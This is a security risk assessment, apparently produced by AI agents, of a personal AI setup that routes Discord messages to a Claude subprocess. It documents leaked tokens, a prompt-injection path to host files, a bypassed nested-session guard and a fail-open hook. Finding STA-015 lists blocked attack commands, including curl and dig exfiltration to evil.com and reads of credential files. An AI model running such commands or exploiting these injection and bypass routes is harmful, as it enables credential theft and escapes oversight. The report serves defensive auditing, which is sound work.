# Enterprise Security Risk Assessment
## SAM Personal AI Infrastructure (PAI)

**Classification:** CONFIDENTIAL - INTERNAL USE ONLY
**Date:** 2026-03-06
**Assessment Type:** Full Codebase Security Review
**Methodology:** Static analysis, credential audit, architecture review, supply chain assessment, compliance mapping

**Assessment Team:**
- **Security Architect** (jagents_security_architect) - Architecture & infrastructure review
- **Security Test Analyst** (jagents_security_test_analyst) - Test coverage & vulnerability identification
- **Chief Security Officer** (jagents_cso) - Executive risk assessment & remediation roadmap

---

## EXECUTIVE SUMMARY

The SAM Personal AI Infrastructure presents a **CRITICAL** overall risk posture driven primarily by an active credential exposure incident. Live Anthropic OAuth tokens and a Discord Bot Token with full guild access have been committed to git history and exist in world-readable files across the project. These credentials appear verbatim in observability log files, compounding the exposure surface. Any party with filesystem access or repository history access can extract these tokens for unauthorized API usage, guild surveillance, or account compromise.

Beyond the credential exposure, the system architecture introduces a novel and systemic risk: Discord user messages are accepted, lightly authorized, and passed directly to a `claude` subprocess spawned with full PAI filesystem access and no sandboxing. The `CLAUDECODE` environment variable is deliberately removed to bypass nested session protections. An attacker who crafts a prompt injection payload via Discord can potentially instruct the Claude subprocess to read, write, or exfiltrate any file accessible to the `obsidium` user account -- including the very credentials this assessment has identified as exposed.

The operational security posture has clear foundations: a security validator hook exists with pattern-based blocking, `.gitignore` covers most sensitive files, WAL-mode SQLite with parameterized queries is used for memory storage, and the observability system provides event tracing. However, these controls are undermined by the credential exposure, world-readable `.env` files, a fail-open security hook design (100ms timeout), a dead authorization function that always returns `true`, and the absence of network-level isolation between the Discord service and the host filesystem.

**Overall Risk Rating: CRITICAL**

---

## TABLE OF CONTENTS

1. [Risk Register Summary](#risk-register-summary)
2. [Security Architect Findings (SA-001 through SA-014)](#security-architect-findings)
3. [Security Test Analyst Findings (STA-001 through STA-017)](#security-test-analyst-findings)
4. [CSO Risk Findings (CSO-001 through CSO-010)](#cso-risk-findings)
5. [OWASP Top 10 Compliance Mapping](#owasp-top-10-compliance-mapping)
6. [Consolidated Remediation Roadmap](#consolidated-remediation-roadmap)
7. [Appendix: Domain Scorecard](#domain-scorecard)

---

## RISK REGISTER SUMMARY

### Critical Findings (Immediate Action Required)

| ID | Source | Title | Risk Score |
|----|--------|-------|------------|
| SA-001 | Architect | Live credentials in world-readable .env files | 9.5/10 |
| SA-002 | Architect | Credentials captured verbatim in observability logs | 9.8/10 |
| CSO-001 | CSO | Live OAuth access tokens committed to git history | 25/25 |
| CSO-002 | CSO | Discord Bot Token and Guild IDs in world-readable file | 20/25 |
| STA-001 | Test Analyst | ~~Dead authorization function - silent allowlist bypass~~ **REMEDIATED** | CRITICAL |
| STA-002 | Test Analyst | ~~Prompt injection via raw Discord message content~~ **REMEDIATED** | CRITICAL |

### High Findings (30-Day Remediation)

| ID | Source | Title | Risk Score |
|----|--------|-------|------------|
| SA-003 | Architect | Voice server no auth + CORS wildcard reflection | 8.2/10 |
| SA-004 | Architect | ~~Prompt injection via Discord messages~~ **REMEDIATED** | 7.8/10 |
| SA-005 | Architect | ~~CLAUDECODE guard deliberately bypassed~~ **REMEDIATED** | 7.5/10 |
| CSO-003 | CSO | ~~Prompt injection from Discord to host filesystem~~ **REMEDIATED** | 15/25 |
| CSO-004 | CSO | ~~Dead authorization function creates false confidence~~ **REMEDIATED** | 8/25 |
| CSO-005 | CSO | ~~Fail-open security hook with 100ms timeout~~ **REMEDIATED** | 9/25 |
| STA-003 | Test Analyst | ~~Subprocess error message information disclosure~~ **REMEDIATED** | HIGH |
| STA-004 | Test Analyst | ~~HISTORY_FILE path evaluated without validation~~ **REMEDIATED** | HIGH |
| STA-005 | Test Analyst | ~~Path traversal via attachment name (partial mitigation)~~ **REMEDIATED** | HIGH |
| STA-006 | Test Analyst | Router tests have no real function coverage | HIGH |
| STA-007 | Test Analyst | Integration tests assert on string literals only | HIGH |
| STA-008 | Test Analyst | ~~No rate limiting or abuse prevention per user~~ **REMEDIATED** | HIGH |
| STA-009 | Test Analyst | ~~Security validator timeout fails open~~ **REMEDIATED** | HIGH |

### Medium Findings (60-Day Remediation)

| ID | Source | Title | Risk Score |
|----|--------|-------|------------|
| SA-006 | Architect | ~~Unsanitized user input in SQLite LIKE fallback~~ **REMEDIATED** | 5.5/10 |
| SA-007 | Architect | TTS sidecar (port 8889) has no authentication | 6.0/10 |
| SA-008 | Architect | ~~Temp files in world-accessible /tmp~~ **REMEDIATED** | 5.8/10 |
| SA-009 | Architect | ~~isMessageAuthorized always returns true (stub)~~ **REMEDIATED** | 6.5/10 |
| SA-010 | Architect | Session keys predictable, no cleanup timer | 5.0/10 |
| SA-011 | Architect | import-docs puts sensitive data in shared SQLite | 5.2/10 |
| CSO-006 | CSO | Session history stored without encryption | 6/25 |
| CSO-007 | CSO | MCP server endpoints with hardcoded API keys | 6/25 |
| CSO-008 | CSO | ~~Supply chain risk from loose dependency versioning~~ **REMEDIATED** | 6/25 |
| CSO-009 | CSO | Telemetry data retention and PII leakage | 6/25 |
| STA-010 | Test Analyst | ~~Observability log contains unsanitized user content~~ **REMEDIATED** | MEDIUM |
| STA-011 | Test Analyst | ~~LIKE pattern injection in semantic fallback search~~ **REMEDIATED** | MEDIUM |
| STA-012 | Test Analyst | No concurrent message processing tests | MEDIUM |
| STA-013 | Test Analyst | Transcription file path not validated against TEMP_DIR | MEDIUM |
| STA-014 | Test Analyst | ~~Config module executes and exits at import time~~ **REMEDIATED** | MEDIUM |
| STA-015 | Test Analyst | ~~Security validator missing Discord-specific patterns~~ **REMEDIATED** | MEDIUM |

### Low / Informational Findings

| ID | Source | Title | Risk Score |
|----|--------|-------|------------|
| SA-012 | Architect | Observability log has no access controls | 3.5/10 |
| SA-013 | Architect | ~~Overly loose dependency version constraints~~ **REMEDIATED** | 3.0/10 |
| SA-014 | Architect | ~~Error messages leak internal architecture to users~~ **REMEDIATED** | 2.0/10 |
| CSO-010 | CSO | Voice server unauthenticated local endpoints | 4/25 |
| STA-016 | Test Analyst | ~~No tests for edge cases in allowedUserIds parsing~~ **REMEDIATED** | LOW |
| STA-017 | Test Analyst | ~~Attachment URL fetched without origin validation~~ **REMEDIATED** | LOW |

---

## SECURITY ARCHITECT FINDINGS

### SA-001: Live Credentials in World-Readable .env Files
**Severity: CRITICAL | Risk Score: 9.5/10**

The file `/Projects/sam/.agent/.env` contains live credentials including a Discord Bot Token and an OpenCode API key. File permissions are `0644` (world-readable). The `.gitignore` patterns at the root level do not adequately cover `.agent/.env`.

**Affected Files:**
- `.agent/.env` (live credentials, 0644)
- `.env` (0644, currently empty but used at runtime)

**Recommendation:**
1. Immediately rotate the exposed Discord Bot Token and OpenCode API key
2. `chmod 600` all `.env` files
3. Add `.agent/.env` to `.gitignore` explicitly
4. Verify tokens haven't been committed to git history: `git log --all --full-diff -p -- '.agent/.env'`

---

### SA-002: Credentials Captured Verbatim in Observability JSONL Logs
**Severity: CRITICAL | Risk Score: 9.8/10**

The observability hook system (`capture-all-events.ts`) captures the full `tool_response` payload of every tool call. When the `Read` tool reads a `.env` file or the `Bash` tool runs `cat .env`, the full file content including live secrets is written to world-readable JSONL log files.

Confirmed in:
- `.agent/history.jsonl` (line 524): Contains Discord bot token
- `.agent/history/raw-outputs/2026-03/2026-03-05_all-events.jsonl` (lines 180, 190, 320): Full `.env` content with live tokens
- `.agent/history/raw-outputs/2026-03/2026-03-06_all-events.jsonl` (lines 497, 651, 673, 691): Secrets captured during this assessment

All files are `0644` (world-readable).

**Affected Files:**
- `.agent/history.jsonl`
- `.agent/history/raw-outputs/2026-03/*`
- `.agent/hook-events/events.db`

**Recommendation:**
1. Rotate all exposed credentials immediately
2. Add a secret-scrubbing filter to `capture-all-events.ts` -- regex redaction for API key patterns (`MTQ[A-Za-z0-9.]+`, `sk-[A-Za-z0-9]+`) before writing
3. `chmod 600` on all log files, `chmod 700` on log directories
4. Add `.agent/history/` and `.agent/hook-events/` to `.gitignore`

---

### SA-003: Voice Server No Auth + CORS Wildcard Reflection
**Severity: HIGH | Risk Score: 8.2/10**

The voice server at `localhost:8888` has zero authentication on all endpoints (`/notify`, `/pai`, `/stream`, `/health`). The CORS implementation reflects any `Origin` header verbatim (confirmed via live test: `Origin: http://evil.com` receives `Access-Control-Allow-Origin: http://evil.com`). Any malicious webpage in a local browser can issue cross-origin requests to port 8888.

**Affected Files:**
- `voice-server/server.ts` (lines 536-540)

**Recommendation:**
1. Fix CORS to use an explicit allowlist instead of reflecting any Origin
2. Add `hostname: "127.0.0.1"` to the `serve()` options
3. Add a shared secret for inter-service authentication

---

### SA-004: Prompt Injection via Discord Messages — **REMEDIATED**
**Severity: HIGH | Risk Score: 7.8/10**

~~User-supplied Discord message content flows directly into the Claude subprocess prompt without sanitization. In `subprocess.ts` lines 76-94, `request.userMessage` is embedded via template literals. The subprocess runs with full PAI filesystem access.~~

**Remediation Applied:**
- `sanitizeUserInput()` checks 10 prompt injection regex patterns before forwarding
- 4000-character message length cap enforced before processing
- Injection-detected messages get safety preamble prepended
- Subprocess sandboxed to read-only tools via `ALLOWED_TOOLS` (Read, Glob, Grep, WebSearch, WebFetch, TodoWrite)
- Sensitive env vars stripped via `buildSanitizedEnv()`
- Depth counter prevents recursive subprocess spawning

**Affected Files:**
- `service/claude/subprocess.ts`

---

### SA-005: CLAUDECODE Guard Deliberately Bypassed — **REMEDIATED**
**Severity: HIGH | Risk Score: 7.5/10**

~~In `subprocess.ts` line 109, the code explicitly removes the `CLAUDECODE` environment variable: `delete subprocessEnv.CLAUDECODE`. This circumvents nested session protection, allowing the subprocess to recursively spawn further Claude subprocesses without depth limits.~~

**Remediation Applied:**
- Added `DISCORD_SUBPROCESS_DEPTH` env var with depth tracking
- `MAX_SUBPROCESS_DEPTH = 1` — subprocess cannot spawn further subprocesses
- Depth incremented in `buildSanitizedEnv()`, checked before spawning
- Returns error response (not exception) when depth limit exceeded
- CLAUDECODE deletion removed; subprocess uses sandboxed tool allowlist instead

**Affected Files:**
- `service/claude/subprocess.ts`

---

### SA-006: Unsanitized User Input in SQLite LIKE Fallback — **REMEDIATED**
**Severity: MEDIUM | Risk Score: 5.5/10**

~~When FTS5 search fails, the code falls back to a `LIKE` query using raw user input. While parameterized queries protect against SQL injection, LIKE wildcard characters (`%`, `_`) in user input cause over-broad matching.~~

**Remediation Applied:**
- Added `escapeLike()` function in `db.ts` that escapes `%` and `_` characters
- `ESCAPE '\\'` clause added to all 3 LIKE queries
- All fallback searches now use `escapeLike(query)` before interpolation

**Affected Files:**
- `service/memory/db.ts`

---

### SA-007: TTS Sidecar (Port 8889) Has No Authentication
**Severity: MEDIUM | Risk Score: 6.0/10**

The Chatterbox TTS Python sidecar on port 8889 has no authentication. Any local process can POST to `/synthesize` with arbitrary text.

**Affected Files:**
- `voice-server/server.ts` (line 219)
- `voice-server/python-sidecar/server.py`

**Recommendation:**
1. Bind explicitly to `127.0.0.1`
2. Add shared secret header between Bun voice server and Python sidecar

---

### SA-008: Temp Files in World-Accessible /tmp — **REMEDIATED**
**Severity: MEDIUM | Risk Score: 5.8/10**

~~Downloaded Discord attachments are written to `/tmp/discord-remote-control/` with predictable timestamp-based filenames. `/tmp` is world-readable on most Linux systems.~~

**Remediation Applied:**
- Temp directory moved to `$PAI_DIR/.tmp/discord-remote-control`
- Directory created with `mode: 0o700` permissions
- Filenames use `randomUUID()` instead of `Date.now()`
- `path.resolve()` + trailing `path.sep` check prevents prefix bypass attacks

**Affected Files:**
- `service/media/download.ts`

---

### SA-009: isMessageAuthorized Always Returns True — **REMEDIATED**
**Severity: MEDIUM | Risk Score: 6.5/10**

~~The `isMessageAuthorized` function in `router.ts` always returns `true` regardless of input. While actual auth is handled downstream, this creates a dangerous refactor trap.~~

**Remediation Applied:**
- Stub function removed entirely from `router.ts`
- `isAuthorized` field removed from `MessageContext`
- Auth handled inline in `handleMessage()` with explicit allowlist + guild/channel checks

**Affected Files:**
- `service/router.ts`

---

### SA-010: Session Keys Predictable, No Cleanup Timer
**Severity: MEDIUM | Risk Score: 5.0/10**

Session keys use format `${userId}:${channelId}` with publicly visible Discord snowflake IDs. The `clearOldSessions` function is never called on a timer.

**Affected Files:**
- `service/claude/session.ts`

**Recommendation:**
1. Add periodic session cleanup timer in `index.ts`
2. Consider adding random nonce to session keys

---

### SA-011: import-docs Puts Sensitive Data in Shared SQLite
**Severity: MEDIUM | Risk Score: 5.2/10**

The `import-docs.ts` script imports MEMORY.md files containing operational details into the shared `memory.db`, making sensitive architecture information accessible to the Claude subprocess.

**Affected Files:**
- `service/scripts/import-docs.ts`
- `discord-remote-control/memory.db`

**Recommendation:**
1. Review and exclude sensitive MEMORY.md files from import
2. `chmod 600` on the SQLite database file

---

### SA-012: Observability Log Has No Access Controls
**Severity: LOW | Risk Score: 3.5/10**

The `history.jsonl` file is `0644` and contains `DiscordAccessDenied` entries with blocked user IDs and channel information.

**Affected Files:**
- `service/observability.ts` (lines 22-26)
- `.agent/history.jsonl`

**Recommendation:**
1. `chmod 600` on `history.jsonl`
2. Separate security events from operational events

---

### SA-013: Overly Loose Dependency Version Constraints — **REMEDIATED**
**Severity: LOW | Risk Score: 3.0/10**

~~`groq-sdk` is pinned as `">=0.4.0"` with no upper bound. `@types/bun` and `bun-types` use `"latest"`.~~

**Remediation Applied:**
- `groq-sdk` removed entirely from dependencies
- `@types/bun` and `bun-types` pinned to `^1.3.10`

**Affected Files:**
- `service/package.json`

---

### SA-014: Error Messages Leak Internal Architecture to Users — **REMEDIATED**
**Severity: INFORMATIONAL | Risk Score: 2.0/10**

~~Error responses sent to Discord contain internal implementation details like "Claude subprocess failed" and Groq API error messages.~~

**Remediation Applied:**
- All handlers now return generic messages: "Sorry, I wasn't able to process..." / "Sorry, I encountered an error..."
- Detailed errors logged internally via `logError()` and `console.error()` only
- No stack traces, file paths, or environment variables exposed to users

**Affected Files:**
- `service/handlers/text.ts`
- `service/handlers/voice.ts`
- `service/handlers/media.ts`

---

## SECURITY TEST ANALYST FINDINGS

### STA-001: Dead Authorization Function - Silent Allowlist Bypass — **REMEDIATED**
**Severity: CRITICAL | Priority: P0**

~~The `isMessageAuthorized` function in `router.ts` (lines 102-105) always returns `true` regardless of inputs.~~

**Remediation Applied:**
- `isMessageAuthorized` stub removed entirely from codebase (grep confirms zero matches)
- `isAuthorized` field removed from `MessageContext`
- Auth handled inline in `handleMessage()` with explicit allowlist + guild/channel checks

**Affected Files:**
- `service/router.ts`

---

### STA-002: Prompt Injection via Raw Discord Message Content — **REMEDIATED**
**Severity: CRITICAL | Priority: P0**

~~Raw Discord message content is inserted verbatim into the Claude subprocess prompt in `subprocess.ts` line 94. Since Claude Code spawns with full PAI filesystem access and tools (Bash, Write, etc.), a successful prompt injection could lead to arbitrary code execution.~~

**Remediation Applied:**
- `sanitizeUserInput()` checks 10 prompt injection regex patterns before forwarding
- 4000-character message length cap enforced
- Injection-detected messages get safety preamble prepended
- Subprocess sandboxed to read-only tools via `ALLOWED_TOOLS`
- `buildSanitizedEnv()` strips TOKEN/SECRET/KEY env vars
- Depth counter prevents recursive subprocess spawning (max 1)

**Affected Files:**
- `service/claude/subprocess.ts`

---

### STA-003: Subprocess Error Message Information Disclosure — **REMEDIATED**
**Severity: HIGH | Priority: P1**

~~Raw subprocess error messages are sent directly to Discord users, potentially exposing stack traces, file paths, and environment variable names.~~

**Remediation Applied:**
- All handlers return generic "Sorry, I wasn't able to process..." messages to Discord
- Detailed errors logged internally only via `logError()` and `console.error()`

**Affected Files:**
- `service/handlers/text.ts`
- `service/handlers/media.ts`
- `service/handlers/voice.ts`

---

### STA-004: HISTORY_FILE Path Evaluated at Module Load Without Validation — **REMEDIATED**
**Severity: HIGH | Priority: P1**

~~`HISTORY_FILE` in `observability.ts` is computed at load time from `process.env.PAI_DIR` with no path traversal validation. If `PAI_DIR` contains `../../etc`, events write to an attacker-controlled path.~~

**Remediation Applied:**
- `path.resolve()` applied to `PAI_DIR` value
- `..` traversal sequence check added — falls back to `/tmp` if detected
- Validated before constructing `HISTORY_FILE` path

**Affected Files:**
- `service/observability.ts`

---

### STA-005: Path Traversal via Attachment Name (Partial Mitigation) — **REMEDIATED**
**Severity: HIGH | Priority: P1**

~~Attachment names are sanitized but `cleanupTempFile` uses `startsWith(TEMP_DIR_BASE)` which has a prefix bypass: `/tmp/discord-remote-control-evil/file` would pass.~~

**Remediation Applied:**
- `path.resolve()` applied to both the local path and TEMP_DIR_BASE
- Trailing `path.sep` appended to base before `startsWith()` check — prevents prefix bypass
- Temp directory moved to `$PAI_DIR/.tmp/` with `0o700` permissions

**Affected Files:**
- `service/media/download.ts`

---

### STA-006: Router Tests Have No Real Function Coverage
**Severity: HIGH | Priority: P1**

All 23 tests in `router.test.ts` assert on locally defined constants and arrays, never importing or calling any function from `router.ts`. If `handleMessage` were deleted, all tests would still pass.

**Affected Files:**
- `service/__tests__/router.test.ts` (entire file)

**Recommended Test Cases:**
- Import `handleMessage` from `router.ts` directly
- Create mock Discord `Message` objects with controlled `author.id`, `channelId`, `guildId`
- Assert unauthorized users don't trigger handlers

---

### STA-007: Integration Tests Assert on String Literals Only
**Severity: HIGH | Priority: P1**

The entire `integration.test.ts` (330 lines, 38 tests) consists of tests asserting on locally defined string literals. No actual imports occur. Zero integration coverage while inflating test counts.

**Affected Files:**
- `service/__tests__/integration.test.ts` (entire file)

**Recommended Test Cases:**
- Actual integration test: mock Discord message -> router -> handler -> subprocess -> response

---

### STA-008: No Rate Limiting or Abuse Prevention Per User — **REMEDIATED**
**Severity: HIGH | Priority: P1**

~~No per-user rate limiting exists. An authorized user can send unlimited messages, each spawning a full Claude subprocess with PAI filesystem permissions.~~

**Remediation Applied:**
- Sliding window rate limiter in `router.ts` — 5 messages per 60 seconds per user
- Rate limit events logged via observability system
- Excess messages rejected before handler invocation

**Affected Files:**
- `service/router.ts`

---

### STA-009: Security Validator Timeout Fails Open — **REMEDIATED**
**Severity: HIGH | Priority: P1**

~~The security-validator hook uses a 100ms timeout on stdin. If stdin takes longer, the hook outputs `{ permissionDecision: 'allow' }` -- granting permission. Same fail-open on any JSON parse error.~~

**Remediation Applied:**
- Timeout extended to 500ms
- Fails CLOSED (deny) on timeout, parse error, or any unhandled exception
- Security event logged on every fail-closed decision
- Exit code 2 ensures Claude Code treats denial as blocking

**Affected Files:**
- `.agent/hooks/security-validator.ts` (lines 155-186)

---

### STA-010: Observability Log Contains Unsanitized User Content — **REMEDIATED**
**Severity: MEDIUM | Priority: P2**

~~`logMessageReceived` captures `preview.substring(0, 100)` from raw `message.content` without applying `sanitizeContext`. If history.jsonl is exposed, user conversation data leaks.~~

**Remediation Applied:**
- `sanitizeForLog()` function applied to message preview before writing to JSONL
- Redacts API keys, tokens, and email patterns from log output

**Affected Files:**
- `service/observability.ts`

---

### STA-011: LIKE Pattern Injection in Semantic Fallback Search — **REMEDIATED**
**Severity: MEDIUM | Priority: P2**

~~The fallback LIKE query uses `%${query}%` where `query` is raw Discord user input. LIKE wildcards (`%`, `_`) cause over-broad matching and potential data leakage across sessions.~~

**Remediation Applied:**
- `escapeLike()` function escapes `%` and `_` in all LIKE query inputs
- `ESCAPE '\\'` clause added to all 3 fallback LIKE queries
- See SA-006 for details

**Affected Files:**
- `service/memory/db.ts`

---

### STA-012: No Concurrent Message Processing Tests
**Severity: MEDIUM | Priority: P2**

No tests for concurrent access patterns despite module-level SQLite singleton and WAL mode.

**Affected Files:**
- `service/memory/db.ts` (line 46)
- `service/__tests__/sqlite-memory.test.ts`

---

### STA-013: Transcription File Path Not Validated Against TEMP_DIR
**Severity: MEDIUM | Priority: P2**

`validateAudioFile` checks file existence and size but not whether the path falls within the expected temp directory.

**Affected Files:**
- `service/media/transcribe.ts` (lines 43, 155-193)

---

### STA-014: Config Module Executes and Exits at Import Time — **REMEDIATED**
**Severity: MEDIUM | Priority: P2**

~~`config.ts` executes `loadConfig()` at module load time (line 60) and calls `process.exit(1)` if variables are missing, making security-focused testing of config validation difficult.~~

**Remediation Applied:**
- `loadConfig()` now throws `ConfigError` instead of calling `process.exit(1)`
- Default export replaced with lazy singleton `getConfig()` — config only loaded on first access
- Consumers updated to use `getConfig()` import
- Config module is now fully testable without process termination

**Affected Files:**
- `service/config.ts`
- `service/index.ts`
- `service/bot.ts`

---

### STA-015: Security Validator Missing Discord-Specific Attack Patterns — **REMEDIATED**
**Severity: MEDIUM | Priority: P2**

~~The security-validator patterns block generic reverse shells but miss Discord-specific attacks: `curl` exfiltration of tokens, `env` dumping, reading bot token files, and shell variable expansion evasion.~~

**Remediation Applied:**
- Added `DISCORD_SPECIFIC_PATTERNS` array covering:
  - Sensitive file access (`.env`, `.credentials.json`, `.claude/` directory) even without piping
  - Base64 encode/decode exfiltration chains
  - DNS exfiltration via `dig`/`nslookup`/`host` with command substitution
  - Netcat standalone data send (file redirection, herestring)
  - Python `urllib`/`requests` and Node `fetch`/`https` one-liner exfiltration
- Added `EVASION_PATTERNS` array covering:
  - Quote-insertion evasion (`c''at`, `c""at`)
  - Backslash evasion (`c\at`, `r\m`)
  - Hex/octal escape sequences (`$'\x63\x61\x74'`)
  - Variable-based command construction (`a=cat; $a file`)
- Added backtick command substitution detection to `curl` and `wget` patterns

**Affected Files:**
- `.agent/hooks/security-validator.ts`

**Verified Test Cases (all blocked):**
- `cat /home/user/.env` → blocked (discord_specific_attack)
- `echo aWQK | base64 -d | bash` → blocked (discord_specific_attack)
- `curl http://evil.com/\`whoami\`` → blocked (credential_exfiltration)
- `dig $(cat /etc/passwd).evil.com` → blocked (discord_specific_attack)
- `c""at /etc/passwd` → blocked (evasion_technique)
- `python3 -c "import urllib..."` → blocked (discord_specific_attack)
- `cat ~/.claude/credentials.json` → blocked (discord_specific_attack)

---

### STA-016: No Tests for Edge Cases in allowedUserIds Parsing — **REMEDIATED**
**Severity: LOW | Priority: P3**

~~Edge cases untested: empty string produces `[""]` after split, whitespace-only entries, duplicate IDs, non-numeric IDs.~~

**Remediation Applied:**
- `loadConfig()` now filters to numeric-only IDs via `/^\d+$/.test(id)`
- Empty strings, whitespace-only entries filtered out
- Duplicate IDs deduplicated via `Set`
- Throws `ConfigError` if no valid IDs remain after filtering

**Affected Files:**
- `service/config.ts`

---

### STA-017: Attachment URL Fetched Without Origin Validation — **REMEDIATED**
**Severity: LOW | Priority: P3**

~~`download.ts` calls `fetch(attachment.url)` without validating the URL is a Discord CDN domain. Hypothetical SSRF if Discord's URL field were poisoned.~~

**Remediation Applied:**
- Added `ALLOWED_CDN_ORIGINS` allowlist (`cdn.discordapp.com`, `media.discordapp.net`)
- URL origin validated before every download — non-Discord URLs rejected with warning
- Invalid URLs also caught and rejected

**Affected Files:**
- `service/media/download.ts`

---

## CSO RISK FINDINGS

### CSO-001: Live OAuth Access Tokens Committed to Git History
**Risk Level: CRITICAL | Likelihood: 5 | Impact: 5 | Score: 25/25**

Anthropic OAuth tokens (`sk-ant-oat01-*`) and refresh tokens (`sk-ant-ort01-*`) appear in at least two commits to `.agent/.credentials.json`. Tokens grant scopes including `user:inference`, `user:mcp_servers`, and `user:sessions:claude_code`. Even if current tokens have expired, refresh tokens may still be valid. A third `opencode` API key was also found in `.agent/.env`.

**Business Impact:** Full API access, financial liability from unauthorized inference calls, account compromise.

**Strategic Recommendation:** Active incident. Revoke all tokens via Anthropic console, regenerate Discord Bot Token, clean git history with `git filter-repo`, and audit API usage logs.

---

### CSO-002: Discord Bot Token and Guild IDs in World-Readable File
**Risk Level: CRITICAL | Likelihood: 4 | Impact: 5 | Score: 20/25**

`.agent/.env` has permissions `-rw-r--r--` containing live Discord Bot Token, Guild ID, Channel ID, and all four allowed user IDs. Any process on the system can read this token for full bot control.

**Business Impact:** Full Discord guild compromise, surveillance of all guild communications, social engineering of allowlisted users.

**Strategic Recommendation:** `chmod 600`, rotate token, add to `.gitignore`, consider secrets manager.

---

### CSO-003: Prompt Injection Risk via Discord to Host Subprocess — **REMEDIATED**
**Risk Level: HIGH | Likelihood: 3 | Impact: 5 | Score: 15/25**

~~Discord messages pass verbatim to a `claude` subprocess with full `obsidium` user permissions. The `CLAUDECODE` variable is deliberately deleted to bypass nested session protection. No chroot, namespace isolation, or seccomp restrictions.~~

**Remediation Applied:**
- `sanitizeUserInput()` with 10 prompt injection regex patterns
- 4000-char message length cap
- Subprocess sandboxed to read-only tools (Read, Glob, Grep, WebSearch, WebFetch, TodoWrite)
- `buildSanitizedEnv()` strips sensitive env vars
- Depth counter prevents recursive subprocess spawning (max 1)
- Safety preamble prepended to injection-flagged messages

**Business Impact:** Significantly reduced — subprocess limited to read-only operations.

---

### CSO-004: Dead Authorization Function Creates False Security Confidence — **REMEDIATED**
**Risk Level: HIGH | Likelihood: 2 | Impact: 4 | Score: 8/25**

~~`isMessageAuthorized` always returns `true`. The `isAuthorized` field in `MessageContext` is misleading. Future refactors may rely on it, bypassing actual auth.~~

**Remediation Applied:**
- `isMessageAuthorized` stub removed entirely
- `isAuthorized` field removed from `MessageContext`
- Auth consolidated inline in `handleMessage()` — explicit allowlist + guild/channel checks

---

### CSO-005: Fail-Open Security Hook with Aggressive Timeout — **REMEDIATED**
**Risk Level: MEDIUM | Likelihood: 3 | Impact: 3 | Score: 9/25**

~~Security validator hook times out at 100ms and fails open. Under load or cold start, all Bash commands pass without validation. Only covers `Bash` tool calls, not file writes or network requests.~~

**Remediation Applied:**
- Timeout extended to 500ms
- Fails CLOSED on all error paths (timeout, parse error, unhandled exception)
- Pattern coverage expanded: netcat, Python reverse shells, curl-pipe-bash, DNS exfiltration, evasion techniques, Discord-specific attack vectors
- Security events logged on every denial for audit trail

**Remaining Gap:** Still only covers `Bash` tool calls, not `Write`/`Edit` or network requests.

---

### CSO-006: Session Conversation History Stored Without Encryption
**Risk Level: MEDIUM | Likelihood: 2 | Impact: 3 | Score: 6/25**

SQLite database and JSONL history files store all conversation turns in plaintext with default permissions. Contains full message content, Discord user IDs, and metadata.

**Business Impact:** Exposure of all user conversation history and system instructions.

**Strategic Recommendation:** Enable SQLite encryption (SQLCipher), implement log rotation with 30-day retention, `chmod 600` on all history files.

---

### CSO-007: MCP Server External Endpoints with Hardcoded API Keys
**Risk Level: MEDIUM | Likelihood: 2 | Impact: 3 | Score: 6/25**

`.mcp.json` configures external MCP servers (httpx, naabu port scanner) with API keys. The `jagents-*` binaries loaded from `/opt/homebrew/bin/` are not integrity-verified.

**Business Impact:** Unauthorized use of security scanning capabilities, potential for scanning unauthorized targets.

**Strategic Recommendation:** Store MCP API keys in environment variables, implement target allowlisting for naabu, verify binary integrity.

---

### CSO-008: Supply Chain Risk from Loose Dependency Versioning — **REMEDIATED**
**Risk Level: MEDIUM | Likelihood: 2 | Impact: 3 | Score: 6/25**

~~`groq-sdk: ">=0.4.0"` (unbounded), `@types/bun: "latest"`, `bun-types: "latest"`.~~

**Remediation Applied:**
- `groq-sdk` removed entirely from dependencies
- `@types/bun` and `bun-types` pinned to `^1.3.10`

**Business Impact:** Reduced — no unbounded version ranges remain.

---

### CSO-009: Telemetry Data Retention and PII Leakage
**Risk Level: LOW-MEDIUM | Likelihood: 3 | Impact: 2 | Score: 6/25**

Hooks capture full tool inputs/outputs to JSONL. Debug directory contains session logs up to 514KB. No documented retention policies or access controls. Discord user IDs logged without pseudonymization.

**Business Impact:** Exposure of usage patterns, Discord IDs, and session metadata.

**Strategic Recommendation:** Log rotation, 90-day retention, pseudonymize Discord IDs, add `--no-telemetry` flag.

---

### CSO-010: Voice Server Architecture - Unauthenticated Local Endpoints
**Risk Level: LOW | Likelihood: 2 | Impact: 2 | Score: 4/25**

Voice server (`localhost:8888`) and TTS sidecar (`localhost:8889`) accept unauthenticated HTTP requests. Any local process can trigger voice synthesis or inject notifications.

**Business Impact:** Denial of service to voice system, potential audio injection.

**Strategic Recommendation:** Bind to `127.0.0.1` explicitly, add per-session shared secret authentication, rate limit `/synthesize`.

---

## OWASP TOP 10 COMPLIANCE MAPPING

| OWASP Category | Status | Key Finding |
|---|---|---|
| A01 - Broken Access Control | **PASS** | Auth stub removed; inline allowlist + guild/channel checks (SA-009, STA-001, CSO-004 — all REMEDIATED) |
| A02 - Cryptographic Failures | **FAIL** | Credentials in plaintext git history and world-readable files (SA-001, SA-002, CSO-001, CSO-002) |
| A03 - Injection | **PASS** | Prompt injection defense with 10 patterns + 4000 char cap (SA-004, STA-002 REMEDIATED); LIKE injection escaped; parameterized queries |
| A04 - Insecure Design | **PASS** | Subprocess sandboxed to read-only tools; fail-closed hook (SA-005, CSO-005, STA-009 — all REMEDIATED) |
| A05 - Security Misconfiguration | **FAIL** | World-readable .env (CSO-002), CORS wildcard reflection (SA-003) |
| A06 - Vulnerable Components | **PASS** | Dependencies pinned (SA-013, CSO-008 REMEDIATED); groq-sdk removed |
| A07 - Auth and Session Failures | **PASS** | Discord allowlist enforced inline; guild/channel checks present |
| A08 - Software and Data Integrity | **PARTIAL** | Lockfile present; MCP binaries not integrity-verified (CSO-007) |
| A09 - Logging and Monitoring | **PARTIAL** | Observability system present but captures secrets (SA-002); no alerting |
| A10 - SSRF | **PASS** | Discord CDN downloads use discord.js library; low risk (STA-017) |

---

## CONSOLIDATED REMEDIATION ROADMAP

### IMMEDIATE (0-48 Hours) - Active Incident Response

| Priority | Action | Findings Addressed |
|----------|--------|-------------------|
| 1 | **Revoke all exposed credentials** - Anthropic OAuth tokens, Discord Bot Token, OpenCode API key | CSO-001, CSO-002, SA-001 |
| 2 | **Clean git history** using `git filter-repo --invert-paths --path .agent/.credentials.json --path .agent/.env` | CSO-001 |
| 3 | **Add to `.gitignore`**: `.agent/.credentials.json`, `.agent/.env`, `.agent/debug/`, `.agent/history/`, `.agent/hook-events/` | SA-001, SA-002, SA-012 |
